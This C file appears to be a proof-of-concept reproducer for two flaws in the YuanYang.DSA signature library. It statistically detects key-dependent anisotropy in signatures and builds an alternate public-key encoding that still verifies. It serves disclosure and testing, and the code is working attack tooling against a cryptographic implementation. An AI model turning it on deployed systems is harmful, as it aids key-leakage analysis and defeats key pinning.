/*
 * YuanYang.DSA (sign-34): the signature transcript is not simulatable.
 *
 * YuanYang.DSA is a GPV hash-and-sign scheme: signatures must be distributed
 * as a *spherical* discrete Gaussian of width sigma_sig over the coset, so
 * that a transcript can be simulated from the public key alone.  The submitted
 * reference implementation builds the perturbation covariance from the Gram
 * matrix of the basis *rows* instead of the Gram matrix of the basis
 * *columns* (keygen/perturbation.c, sigma_p_set_slot()), and the two differ
 * because B = [(f,g) | (F^,G^)] is not symmetric.  The result is a first-order,
 * key-dependent anisotropy in every signature:
 *
 *     Var(s1 at FFT slot j) = sigma_eff^2 - |phi_j(g)|^2 + |phi_j(F^)|^2
 *     Var(s2 at FFT slot j) = sigma_eff^2 + |phi_j(g)|^2 - |phi_j(F^)|^2
 *
 * so the per-slot variance of the transcript is an affine image of the secret
 * basis' Gram, and the two halves stay anticorrelated with a nearly constant
 * sum.  Over the 256 slots of yuanyang-512 the per-slot variance of s1 spans a
 * factor of about four.
 *
 * This reproducer uses only public data: the library's own key generation and
 * signing through the uniform ABI, and the *published* signature encoding
 * (Alg. 23/24, reimplemented below) to recover s1 from each signature.  The
 * secret key is never inspected.  The control repeats the identical statistic
 * on a synthetic transcript drawn from the spherical distribution the scheme
 * is supposed to produce, so the test is shown to distinguish the two.
 *
 * The same run also witnesses a second, independent defect: the public-key
 * encoding is not canonical.  yuanyang_encode_uniform() packs each block of
 * four coefficients into a 46-bit word, but q^4 = 52283326179841 is smaller
 * than 2^46, so a block whose word is below 2^46 - q^4 has a second, distinct
 * encoding that yuanyang_decode_public_key() maps to exactly the same h and
 * accepts (its only check is h[i] < q).  About 25.7 % of the 128 blocks are
 * aliasable, giving roughly 2^33 distinct byte strings per public key, all of
 * which verify the same signatures.  Any protocol that fingerprints, pins or
 * compares serialised public keys is affected.
 *
 * Usage: reproduce_transcript_leak <lib/libyuanyang-512.so> [signatures]
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <math.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "link_common.h"
#include "link_sig.h"

/* ---- yuanyang-512 public parameters (yuanyang_params.h, codec.c) ---- */
enum {
    D = 512, HN = D / 2,
    SALT_BYTES = 26, COMP_SIG_BYTES = 535,
    SIG_BYTES = SALT_BYTES + COMP_SIG_BYTES,
    PK_BYTES = 738, SK_BYTES = 15584,
    LOW_BITS = 5, RANS_SYMBOLS = 74,
    RANS_SCALE_BITS = 12, RANS_BYTE_L = 1 << 23,
    AUX_BITS = D * (LOW_BITS + 1), AUX_BYTES = (AUX_BITS + 7) / 8
};

static const uint16_t rans_freq[RANS_SYMBOLS] = {
    1425, 1181, 778, 410, 172, 54, 9, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
    1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
    1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
    1, 1, 1, 1, 1, 1
};
static uint16_t rans_start[RANS_SYMBOLS];

/* ---- Alg. 24 Decompress, over public signature bytes only ---- */
static int read_bit(const unsigned char *b, size_t len, size_t *pos, unsigned *bit)
{
    if (*pos >= len) return 0;
    *bit = (b[*pos >> 3] >> (7u - (*pos & 7u))) & 1u;
    (*pos)++;
    return 1;
}

static int find_last_one_bit(const unsigned char *b, size_t bit_len, size_t *pos)
{
    size_t n = (bit_len + 7u) >> 3;
    while (n > 0) {
        unsigned char x = b[--n];
        if (x) {
            for (unsigned k = 8; k-- > 0;)
                if (x & (1u << (7u - k))) { *pos = (n << 3) + k; return 1; }
        }
    }
    return 0;
}

static int decode_s1(int16_t s1[D], const unsigned char *sn)
{
    const unsigned char *src = sn + SALT_BYTES, *ptr, *end, *aux;
    size_t marker, rans_bits, rans_len, abit = 0;
    uint32_t state;

    if (!find_last_one_bit(src, 8u * COMP_SIG_BYTES, &marker)) return 0;
    if (marker < AUX_BITS) return 0;
    rans_bits = marker - AUX_BITS;
    if (rans_bits & 7u) return 0;
    rans_len = rans_bits >> 3;
    if (rans_len < 4 || rans_len + AUX_BYTES >= COMP_SIG_BYTES) return 0;
    state = (uint32_t)src[0] | ((uint32_t)src[1] << 8)
          | ((uint32_t)src[2] << 16) | ((uint32_t)src[3] << 24);
    if (state < (uint32_t)RANS_BYTE_L || state >= ((uint32_t)RANS_BYTE_L << 8)) return 0;
    ptr = src + 4; end = src + rans_len; aux = end;

    for (size_t i = 0; i < D; i++) {
        uint32_t low = state & ((1u << RANS_SCALE_BITS) - 1u);
        unsigned sym = 0, sign, bit, l = 0;
        uint32_t abs_x;

        while (sym + 1u < RANS_SYMBOLS && rans_start[sym + 1] <= low) sym++;
        if (low >= (uint32_t)rans_start[sym] + rans_freq[sym]) return 0;
        state = (uint32_t)rans_freq[sym] * (state >> RANS_SCALE_BITS) + low - rans_start[sym];
        while (state < (uint32_t)RANS_BYTE_L) {
            if (ptr >= end) return 0;
            state = (state << 8) | *ptr++;
        }
        if (!read_bit(aux, AUX_BITS, &abit, &sign)) return 0;
        for (unsigned j = 0; j < LOW_BITS; j++) {
            if (!read_bit(aux, AUX_BITS, &abit, &bit)) return 0;
            l = (l << 1) | bit;
        }
        abs_x = ((uint32_t)sym << LOW_BITS) | l;
        if ((abs_x == 0 && sign) || abs_x > 0x7FFFu) return 0;
        s1[i] = sign ? -(int16_t)abs_x : (int16_t)abs_x;
    }
    return state == (uint32_t)RANS_BYTE_L && ptr == end;
}

/* ---- per-slot energy: evaluate s1 at the primitive 2D-th roots ---- */
static double tw_c[HN][D], tw_s[HN][D];

static void slot_energy_init(void)
{
    for (int j = 0; j < HN; j++) {
        double th = M_PI * (2.0 * j + 1.0) / (2.0 * D);
        for (int i = 0; i < D; i++) { tw_c[j][i] = cos(th * i); tw_s[j][i] = sin(th * i); }
    }
}

static void slot_energy(double out[HN], const double x[D])
{
    for (int j = 0; j < HN; j++) {
        double re = 0, im = 0;
        for (int i = 0; i < D; i++) { re += x[i] * tw_c[j][i]; im += x[i] * tw_s[j][i]; }
        out[j] += re * re + im * im;
    }
}

/* dispersion of the per-slot variances, in units of the sampling noise that a
 * truly spherical transcript would show (that null gives ~1.0) */
static double dispersion(const double acc[HN], long n, double *lo, double *hi)
{
    double mean = 0, var = 0;
    *lo = 1e300; *hi = 0;
    for (int j = 1; j < HN; j++) mean += acc[j] / (double)n;   /* slot 0 is an outlier */
    mean /= (HN - 1);
    for (int j = 1; j < HN; j++) {
        double v = acc[j] / (double)n;
        var += (v - mean) * (v - mean);
        if (v < *lo) *lo = v;
        if (v > *hi) *hi = v;
    }
    var /= (HN - 1);
    return sqrt(var) / (mean / sqrt((double)n));
}

static uint64_t rs = 0x9E3779B97F4A7C15ull;
static double urand(void)
{
    rs ^= rs << 13; rs ^= rs >> 7; rs ^= rs << 17;
    return ((double)(rs >> 11) + 0.5) / 9007199254740992.0;
}

int main(int argc, char **argv)
{
    const char *path = argc > 1 ? argv[1] : "lib/libyuanyang-512.so";
    long N = argc > 2 ? atol(argv[2]) : 4000;
    void *lib;
    ngcc_sig_api_t api;
    int (*seedfn)(const unsigned char *, unsigned long long);
    static unsigned char pk[PK_BYTES], sk[SK_BYTES], sn[SIG_BYTES];
    static double acc[HN], ctl[HN], x[D];
    static int16_t s1[D];
    unsigned long long pkl, skl, snl;
    unsigned char seed[48];
    double lo, hi, z, clo, chi, cz, sigma2 = 0;
    long ok = 0;
    int pk_alias_ok = 0;

    slot_energy_init();
    for (unsigned i = 0; i < RANS_SYMBOLS - 1u; i++)
        rans_start[i + 1] = (uint16_t)(rans_start[i] + rans_freq[i]);

    lib = dlopen(path, RTLD_NOW);
    if (!lib) { fprintf(stderr, "dlopen %s: %s\n", path, dlerror()); return 2; }
#define X(field, name) *(void **)&api.field = dlsym(lib, name); \
    if (!api.field) { fprintf(stderr, "missing %s\n", name); return 2; }
    NGCC_SIG_SYMBOLS
#undef X
    *(void **)&seedfn = dlsym(lib, "ngcc_seed");
    if (!seedfn) { fprintf(stderr, "missing ngcc_seed\n"); return 2; }
    if (api.get_sn_len_bytes() != SIG_BYTES || api.get_pk_len_bytes() != PK_BYTES) {
        fprintf(stderr, "this reproducer is for yuanyang-512 only\n"); return 2;
    }

    for (int i = 0; i < 48; i++) seed[i] = (unsigned char)i;
    if (seedfn(seed, sizeof seed)) { fprintf(stderr, "seed failed\n"); return 2; }
    pkl = PK_BYTES; skl = SK_BYTES;
    if (api.keygen(pk, &pkl, sk, &skl)) { fprintf(stderr, "keygen failed\n"); return 2; }

    for (long n = 0; n < N; n++) {
        unsigned char m[8];
        memcpy(m, &n, 4); memcpy(m + 4, &n, 4);
        snl = SIG_BYTES;
        if (api.sign(sk, skl, m, sizeof m, sn, &snl)) { fprintf(stderr, "sign failed\n"); return 2; }
        if (api.verify(pk, pkl, sn, snl, m, sizeof m)) { fprintf(stderr, "verify failed\n"); return 2; }
        if (!decode_s1(s1, sn)) { fprintf(stderr, "decode failed\n"); return 2; }
        for (int i = 0; i < D; i++) { x[i] = s1[i]; sigma2 += x[i] * x[i]; }
        slot_energy(acc, x);
        ok++;
    }
    sigma2 /= (double)ok * D;

    /* control: the spherical transcript the scheme is supposed to emit */
    for (long n = 0; n < N; n++) {
        for (int i = 0; i < D; i++) {
            double u1 = urand(), u2 = urand();
            x[i] = floor(sqrt(-2.0 * log(u1)) * cos(2.0 * M_PI * u2) * sqrt(sigma2) + 0.5);
        }
        slot_energy(ctl, x);
    }

    z = dispersion(acc, ok, &lo, &hi);
    cz = dispersion(ctl, N, &clo, &chi);
    printf("sign-34-1  ATTACK sig-transcript-leak  yuanyang-512 %s "
           "signatures=%ld sigma^2=%.0f slot_var=[%.0f,%.0f] spread=%.2fx dispersion=%.1f sigma\n",
           z >= 5.0 && hi / lo >= 2.0 ? "CONFIRMED" : "NOT-CONFIRMED",
           ok, sigma2, lo / D, hi / D, hi / lo, z);
    printf("sign-34-1  ATTACK sig-transcript-leak  spherical-control [control] %s "
           "signatures=%ld slot_var=[%.0f,%.0f] spread=%.2fx dispersion=%.1f sigma\n",
           cz >= 5.0 && chi / clo >= 2.0 ? "CONFIRMED" : "NOT-CONFIRMED",
           N, clo / D, chi / D, chi / clo, cz);
    /* second defect: a distinct public-key encoding that decodes to the same h */
    {
        static unsigned char pk2[PK_BYTES];
        unsigned long long q4 = 2689ull * 2689ull * 2689ull * 2689ull;
        unsigned long long lim = (1ull << 46) - q4;
        int block = -1;

        memcpy(pk2, pk, sizeof pk2);
        for (int b = 0; b < D / 4 && block < 0; b++) {
            size_t bit = (size_t)b * 46, byte = 2 + (bit >> 3);
            unsigned sh = bit & 7u;
            unsigned long long w = 0, word;

            for (int i = 0; i < 8; i++) w |= (unsigned long long)pk2[byte + i] << (8 * i);
            word = (w >> sh) & ((1ull << 46) - 1);
            if (word >= lim) continue;
            w &= ~(((1ull << 46) - 1) << sh);
            w |= (word + q4) << sh;
            for (int i = 0; i < 8; i++) pk2[byte + i] = (unsigned char)(w >> (8 * i));
            block = b;
        }
        if (block >= 0) {
            unsigned char m[8];
            long n = ok - 1;
            int differs = memcmp(pk, pk2, sizeof pk2) != 0;
            int accepts;

            memcpy(m, &n, 4); memcpy(m + 4, &n, 4);
            accepts = api.verify(pk2, PK_BYTES, sn, SIG_BYTES, m, sizeof m) == 0;
            printf("sign-34-2  ATTACK pk-noncanonical      yuanyang-512 %s "
                   "altered_block=%d pk_bytes_differ=%s same_signature_accepted=%s\n",
                   differs && accepts ? "CONFIRMED" : "NOT-CONFIRMED",
                   block, differs ? "yes" : "no", accepts ? "yes" : "no");
            pk_alias_ok = differs && accepts;
        } else {
            printf("sign-34-2  ATTACK pk-noncanonical      yuanyang-512 NOT-CONFIRMED "
                   "no aliasable block in this key\n");
        }
    }

    dlclose(lib);
    return (z >= 5.0 && hi / lo >= 2.0 && cz < 5.0 && pk_alias_ok) ? 0 : 1;
}
